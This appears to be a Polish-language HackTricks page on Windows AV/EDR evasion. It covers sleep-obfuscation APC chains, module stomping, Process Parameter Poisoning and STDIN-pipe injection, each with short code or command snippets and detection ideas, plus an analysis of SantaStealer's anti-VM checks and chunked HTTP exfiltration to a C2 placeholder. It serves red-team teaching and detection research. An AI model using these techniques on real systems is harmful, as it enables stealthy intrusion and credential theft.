Jeśli dyspozycja z kolejki timerów jest zbyt charakterystyczna, tę samą sekwencję uśpienia, szyfrowania, spoofingu i przywracania można wykonać z poziomu wstrzymanego wątku pomocniczego za pomocą kolejkowanych APC:<sup>[[27]](#references)</sup>

- Utwórz wątek pomocniczy z `NtTestAlert` jako punktem wejścia.
- Umieść przygotowane ramki `CONTEXT`/APC w kolejce za pomocą `NtQueueApcThread` i opróżnij ją przez `NtAlertResumeThread`.
- Przechowuj stan łańcucha na heapie zamiast na stosie wątku, aby uniknąć wyczerpania domyślnego stosu wątku o rozmiarze 64 KB.
- Użyj `NtSignalAndWaitForSingleObject`, aby atomowo zasygnalizować zdarzenie startowe i zablokować działanie.
- Wstrzymaj główny wątek przed przywróceniem TIB/kontekstu (`NtSuspendThread` → przywrócenie → `NtResumeThread`), aby skrócić okno wyścigu, w którym skaner mógłby wykryć częściowo przywrócony stos.

Zastępuje to charakterystyczne połączenie `CreateTimerQueueTimer` + `NtContinue` sygnaturą wątku pomocniczego/APC, zachowując te same cele maskowania RC4 i spoofingu stosu.

Dodatkowe pomysły na detekcję
- `NtSetInformationVirtualMemory` z `VmCfgCallTargetInformation` krótko przed uśpieniem, oczekiwaniem lub dyspozycją APC.
- `GetThreadContext`/`SetThreadContext` używane w połączeniu z `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` lub `ConnectNamedPipe`.
- `NtQueryInformationThread`, po którym następują bezpośrednie zapisy do granic stosu TEB/TIB bieżącego wątku.
- Łańcuchy `NtQueueApcThread`/`NtAlertResumeThread` pośrednio prowadzące do `SystemFunction032`, `VirtualProtect` lub funkcji pomocniczych przywracających uprawnienia sekcji.
- Powtarzające się użycie krótkich sygnatur gadżetów, takich jak `FF 23` (`jmp [rbx]`) lub `FF E7` (`jmp rdi`), jako punktów przestawienia dyspozycji wewnątrz podpisanych modułów.


## Precyzyjne module stomping

Module stomping uruchamia payloady z **sekcji `.text` DLL-a już zmapowanego w procesie docelowym**, zamiast alokować oczywistą prywatną pamięć wykonywalną lub ładować nowy, ofiarny DLL. Celem nadpisania powinien być **załadowany obraz oparty na pliku**, którego obszar kodu może pomieścić payload bez uszkadzania ścieżek kodu, których proces nadal potrzebuje.<sup>[[1]](#references)[[2]](#references)</sup>

### Niezawodny wybór celu

Naiwny stomping typowych modułów, takich jak `uxtheme.dll` lub `comctl32.dll`, jest zawodny: DLL może nie być załadowany w zdalnym procesie, a zbyt mały obszar kodu spowoduje awarię procesu. Bardziej niezawodny przebieg pracy:

1. Wylicz moduły procesu docelowego i pozostaw na liście dozwolonych zawierającej wyłącznie nazwy te DLL-e, które są już załadowane.
2. Najpierw zbuduj payload i zapisz jego **dokładny rozmiar w bajtach**.
3. Przeskanuj kandydackie DLL-e na dysku i porównaj rozmiar sekcji PE **`.text` `Misc_VirtualSize`** z rozmiarem payloadu. Ma to większe znaczenie niż rozmiar pliku, ponieważ odzwierciedla rozmiar sekcji wykonywalnej **po zmapowaniu w pamięci**.
4. Przeanalizuj **Export Address Table (EAT)** i wybierz RVA eksportowanej funkcji jako początkowy offset stompingu.
5. Oblicz **zasięg oddziaływania**: jeśli payload przekracza granicę wybranej funkcji, nadpisze sąsiednie eksporty ułożone za nią w pamięci.

Typowe narzędzia pomocnicze do rozpoznania/wyboru celu spotykane w praktyce:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operational notes
- Prefer DLLs **already loaded** in the remote process to avoid the telemetry of `LoadLibrary`/unexpected image loads.
- Prefer exports that are rarely executed by the target application; otherwise, normal code paths may hit the stomped bytes before or after thread creation.
- Large implants often require changing shellcode embedding from a string literal to a **byte-array/braced initializer** so the full buffer is represented correctly in the injector source.

Detection ideas
- Remote writes into **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) instead of the more common private RWX/RX allocations.
- Export entry points whose in-memory bytes no longer match the backing file on disk.
- Remote threads or context pivots that begin execution inside a legitimate DLL export whose first bytes were recently modified.
- Suspicious `VirtualProtect(Ex)` / `WriteProcessMemory` sequences against DLL `.text` pages followed by thread creation.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) to technika **process-injection / EDR-evasion**, która omija klasyczną ścieżkę zdalnego zapisu (`VirtualAllocEx` + `WriteProcessMemory`). Zamiast kopiować bajty do już działającego procesu docelowego, wykorzystuje fakt, że Windows **kopiuje wybrane parametry startowe `CreateProcessW` do procesu potomnego** i przechowuje je w `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers copied by `CreateProcessW`

Przydatne nośniki to:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (z `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Ograniczenia praktyczne dotyczące nośników:

- `lpCommandLine` musi wskazywać na **zapisywalną pamięć** dla `CreateProcessW`, a jego długość jest ograniczona do **32 767 znaków Unicode**, łącznie z terminatorem null.
- `lpEnvironment` musi być blokiem środowiska Unicode złożonym z kolejnych ciągów `NAME=VALUE\0`, zakończonym dodatkowym `\0`.
- `lpReserved` jest oficjalnie zarezerwowane, więc mapowanie `ShellInfo` należy traktować jako szczegół implementacyjny, a nie stabilną, udokumentowaną umowę.

Dzięki temu zwykłe tworzenie procesu staje się **mechanizmem transferu payloadu**. Operator tworzy proces potomny z kontrolowanymi przez atakującego danymi startowymi i pozwala Windows wykonać kopię między procesami.

### Remote lookup flow without remote write APIs

Po utworzeniu procesu potomnego odszukaj skopiowany bufor za pomocą prymitywów **tylko do odczytu**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → pobierz `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Odczytaj zdalny `PEB`
3. Podążaj za `PEB.ProcessParameters`
4. Odczytaj `RTL_USER_PROCESS_PARAMETERS`
5. Użyj wybranego wskaźnika:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimalny przebieg:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Wykonywanie skopiowanego bufora parametrów

Skopiowany obszar parametrów zwykle ma uprawnienia `RW`, a nie jest wykonywalny. Typowy łańcuch P3 wygląda następująco:

1. Utwórz proces normalnie (nie w stanie zawieszenia)
2. Ustaw uprawnienia wybranej strony parametrów na wykonywalne za pomocą `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Ponownie użyj uchwytu głównego wątku zwróconego już w `PROCESS_INFORMATION`
4. Przekieruj wykonanie za pomocą `NtSetContextThread` (`CONTEXT_CONTROL`, nadpisz `RIP`)

W przeciwieństwie do klasycznych metod przejmowania wątku nie wymaga to użycia `SuspendThread` / `ResumeThread`; kontekst można zmienić bezpośrednio za pomocą zwróconego uchwytu głównego wątku.

Pozwala to uniknąć kilku API często monitorowanych pod kątem wstrzykiwania:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- często także `SuspendThread` / `ResumeThread`

### Ograniczenie związane z bajtem null i wieloetapowy shellcode

Wszystkie trzy nośniki zawierają **ciągi znaków lub dane podobne do ciągów**, więc surowy payload zawierający `0x00` zostaje obcięty podczas przesyłania. Praktycznym obejściem jest **pierwszy etap bez bajtów null**, który odtwarza stałe w czasie działania, a następnie ładuje dowolny drugi etap.

Prosty wzorzec polega na syntezie stałych za pomocą XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

This pozwala pierwszemu etapowi tworzyć na stosie ciągi znaków, argumenty API, ścieżki DLL lub loader shellcode’u drugiego etapu bez umieszczania bajtów null w przesyłanym parametrze.

### Wywołania API oparte na stosie z pierwszego etapu

Gdy pierwszy etap musi wywołać API, takie jak `LoadLibraryA`, może:

- umieścić ciąg/bufor na stosie procesu docelowego
- zarezerwować **32-bajtowy x64 shadow space**
- ustawić `RCX`, `RDX`, `R8`, `R9` na stałe wartości lub wskaźniki względem `RSP`
- zachować **16-bajtowe wyrównanie** `RSP` przed wywołaniem

Drugi etap można następnie skopiować ze stosu do alokacji `PAGE_READWRITE`, zmienić jej ochronę na `PAGE_EXECUTE_READ` za pomocą `VirtualProtect` i przekazać do niej wykonanie, unikając bezpośredniej alokacji RWX.

### Wskazówki dotyczące wykrywania

Dobre możliwości wykrywania wymienione przez autorów:

- `VirtualProtectEx` / `NtProtectVirtualMemory` zmieniające strony parametrów procesu na wykonywalne
- po takiej zmianie ochrony następuje `SetThreadContext` / `NtSetContextThread`
- zdalne odczyty `PEB`, a następnie `RTL_USER_PROCESS_PARAMETERS`
- nietypowo długie wartości lub wartości o wysokiej entropii w `lpCommandLine`, `lpEnvironment` lub `STARTUPINFO.lpReserved` podczas tworzenia procesu

### Uwagi

- P3 to **sztuczka transferu między procesami**, a nie samodzielna, pełna metoda uruchamiania kodu: skopiowany parametr nadal wymaga zmiany uprawnień na wykonywanie oraz metody przekierowania wykonania.
- Autorzy rozważali `RtlCreateProcessReflection` / Dirty Vanity, ale odrzucili tę metodę, ponieważ wewnętrznie korzysta z podejrzanych prymitywów, takich jak `NtWriteVirtualMemory` i `NtCreateThreadEx`.

## Wstrzykiwanie przez potok konsoli STDIN

Interaktywny proces potomny konsoli może również posłużyć jako **prymityw transferu payloadu**. Injector przekierowuje standardowe wejście procesu potomnego do potoku i wysyła znacznik, po którym następuje shellcode. Gdy program konsolowy odczyta dane do własnej prywatnej pamięci, injector odnajduje ten bufor, nadaje mu uprawnienia wykonywania i przekierowuje do niego wątek procesu potomnego. Pozwala to uniknąć `VirtualAllocEx` i `WriteProcessMemory`, ale nadal jest to process injection, a nie ogólna metoda obejścia EDR.<sup>[[41]](#references)</sup>

Mimo opisu „named-pipe” implementacja referencyjna wywołuje `CreatePipe`, które tworzy **anonymous pipe**. Windows implementuje anonymous pipes wewnętrznie za pomocą obiektów potoku o unikatowych nazwach, ale PoC ani nie wybiera ścieżki `\\.\pipe\<name>`, ani nie wywołuje `CreateNamedPipe`. Tworzy dziedziczone uchwyty z domyślnym deskryptorem zabezpieczeń, umieszcza uchwyt odczytu w `STARTUPINFO.hStdInput`, ustawia `STARTF_USESTDHANDLES` i uruchamia nowy proces potomny z włączonym dziedziczeniem uchwytów. Dlatego ten PoC uruchamia podany plik wykonywalny konsoli; nie podłącza swojego potoku do istniejącego procesu.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Referencyjny przebieg działania

Implementacja wykorzystuje następujący łańcuch:<sup>[[41]](#references)</sup>

1. Utwórz pary anonymous pipes dla `STDIN` i `STDOUT` procesu potomnego. Wyłącz dziedziczenie dla dwóch uchwytów po stronie procesu nadrzędnego i zamknij w nim duplikaty uchwytów po stronie procesu potomnego po utworzeniu procesu.
2. Uruchom interaktywny plik wykonywalny, taki jak `netsh.exe` lub `nslookup.exe`, z flagą `CREATE_NEW_CONSOLE`. Proces potomny dziedziczy przekierowane uchwyty standardowe.
3. Wyślij całą tablicę binarną `rawData` za pomocą `WriteFile` przez uchwyt `STDIN` po stronie procesu nadrzędnego. Program konsolowy odczytuje bajty i pozostawia ich kopię w jednym z własnych prywatnych, zatwierdzonych regionów.
4. Przejdź przez przestrzeń adresową procesu potomnego za pomocą `VirtualQueryEx`, odczytaj kandydatów na regiony `MEM_PRIVATE` za pomocą `ReadProcessMemory` i wyszukaj znacznik na początku `rawData`.
5. Zmień ochronę odnalezionego bufora na `PAGE_EXECUTE_READWRITE` za pomocą `VirtualProtectEx`.
6. Zidentyfikuj główny wątek, wstrzymaj go, ustaw `RIP` na `found_address + 0x19` za pomocą `NtSetContextThread` i wznów jego działanie.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Dostarczona implementacja jest specyficzna dla x64: modyfikuje `CONTEXT.Rip`, a osadzony payload to shellcode x64. `rawData` zaczyna się od 25-bajtowego znacznika, więc wykonywalne bajty zaczynają się pod offsetem szesnastkowym `0x19`. Przy wymianie payloadu zachowaj ten układ albo zaktualizuj jednocześnie znacznik, wektor wyszukiwania, rozmiar tablicy i offset wykonania. Komentarze w kodzie źródłowym wymieniają też `0x0A`, `0x0D` i `0x1A` jako niedozwolone znaki. Ten workflow nie zmienia tokenu ani uprawnień procesu potomnego.<sup>[[41]](#references)</sup>

Wzorce kompilacji małych natywnych helperów i payloadów opisano w [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Tradecraft SantaStealer: bezplikowe omijanie zabezpieczeń i kradzież poświadczeń

SantaStealer (znany też jako BluelineStealer) pokazuje, jak współczesne infostealery łączą omijanie AV, anti-analysis i pozyskiwanie poświadczeń w jednym workflow.<sup>[[24]](#references)</sup>

### Filtrowanie według układu klawiatury i opóźnienie w sandboxie

- Flaga konfiguracji (`anti_cis`) wylicza zainstalowane układy klawiatury za pomocą `GetKeyboardLayoutList`. Jeśli wykryje układ cyrylicki, próbka tworzy pusty znacznik `CIS` i kończy działanie przed uruchomieniem stealerów, dzięki czemu nie aktywuje się w wykluczonych regionach, a jednocześnie pozostawia artefakt przydatny do wyszukiwania.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Warstwowa logika `check_antivm`

- Wariant A przechodzi przez listę procesów, oblicza dla każdej nazwy własną sumę kontrolną metodą rolling checksum i porównuje ją z osadzonymi listami blokującymi debuggerów/sandboxów; ponownie oblicza sumę kontrolną dla nazwy komputera i sprawdza katalogi robocze, takie jak `C:\analysis`.
- Wariant B sprawdza właściwości systemu (minimalną liczbę procesów, niedawny czas od uruchomienia), wywołuje `OpenServiceA("VBoxGuest")`, aby wykryć dodatki VirtualBox, i mierzy czas wokół operacji uśpienia, by wykryć wykonywanie krok po kroku. Każde wykrycie powoduje przerwanie działania przed uruchomieniem modułów.

### Pomocnik bez plików + podwójne ładowanie refleksyjne ChaCha20

- Główna biblioteka DLL/plik EXE zawiera pomocnika do kradzieży poświadczeń z Chromium, który jest zapisywany na dysku albo ręcznie mapowany w pamięci; w trybie bezplikowym samodzielnie rozwiązuje importy/relokacje, więc nie powstają żadne artefakty pomocnika.
- Pomocnik przechowuje bibliotekę DLL drugiego etapu, dwukrotnie zaszyfrowaną za pomocą ChaCha20 (dwa klucze 32-bajtowe + 12-bajtowe nonce). Po obu etapach odszyfrowywania refleksyjnie ładuje blob (bez `LoadLibrary`) i wywołuje eksporty `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` pochodzące z [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Procedury ChromElevator używają reflective process hollowing z direct-syscall, aby wstrzyknąć kod do działającej przeglądarki Chromium, odziedziczyć klucze AppBound Encryption i odszyfrować hasła/pliki cookie/dane kart kredytowych bezpośrednio z baz SQLite, mimo zabezpieczeń ABE.

### Modułowe zbieranie danych w pamięci i eksfiltracja HTTP w porcjach

- `create_memory_based_log` przechodzi przez globalną tablicę wskaźników do funkcji `memory_generators` i uruchamia po jednym wątku dla każdego włączonego modułu (Telegram, Discord, Steam, zrzuty ekranu, dokumenty, rozszerzenia przeglądarki itd.). Każdy wątek zapisuje wyniki do współdzielonych buforów i po około 45 sekundach oczekiwania na zakończenie zgłasza liczbę plików.
- Po zakończeniu wszystkie dane są pakowane za pomocą statycznie linkowanej biblioteki `miniz` do pliku `%TEMP%\\Log.zip`. Następnie `ThreadPayload1` czeka 15 sekund i przesyła archiwum przez HTTP POST w porcjach po 10 MB na adres `http://<C2>:6767/upload`, podszywając się pod granicę `multipart/form-data` przeglądarki (`----WebKitFormBoundary***`). Każda porcja zawiera nagłówki `User-Agent: upload`, `auth: <build_id>` oraz opcjonalnie `w: <campaign_tag>`, a w ostatniej porcji dodawane jest `complete: true`, aby serwer C2 wiedział, że scalanie danych zostało zakończone.

## References

- [1] [Zaawansowane techniki unikania wykrycia: precyzyjne module stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Stosy wywołań: koniec pobłażliwego traktowania malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – dokumentacja](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – przykład](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – przykład](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC do spoofingu stosu wywołań](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nowy łańcuch infekcji i zaciemnianie oparte na ConfuserEx w przypadku DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Czy można ufać modelowi zero trust? Omijanie kontroli stanu urządzenia Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Przed ToolShell: analiza wcześniejszych operacji ransomware Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: nadużywanie eksportów przekazywanych dalej](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Wykaz eksportów przekazywanych dalej w Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Kolejność wyszukiwania bibliotek DLL](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Zabezpieczenia procesów i prawa dostępu](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Informacje o EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Program uruchamiający CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Odpieranie ataków EDR dzięki ochronie Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Przełamywanie ochronnej powłoki Windows Defender za pomocą techniki przekierowania folderu](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Dokumentacja polecenia mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Pod czystą zasłoną: od RAT-a przez builder do kodera](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer nadchodzi: nowy, ambitny infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – odszyfrowywanie Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: zwalczanie malware Node.js za pomocą śledzenia API](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Śpiąca królewna: usypianie Adaptix za pomocą Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Zatruwanie parametrów procesu](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Śpiąca królewna II: CFG, CET i spoofing stosu](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Zaciemnianie uśpienia Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Ukrywanie .NET ETW](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Nadużywanie Chrome Remote Desktop w operacjach Red Team: praktyczny przewodnik](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: wykorzystanie sterownika naprawczego Defendera jako prymitywu operacji w jądrze](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Kod towarzyszący MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: tworzenie samomaskujących funkcji za pomocą LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - kod źródłowy InjectSetConsole](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Funkcja CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Tworzenie procesu potomnego z przekierowanym wejściem i wyjściem](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
{{#include ../banners/hacktricks-training.md}}
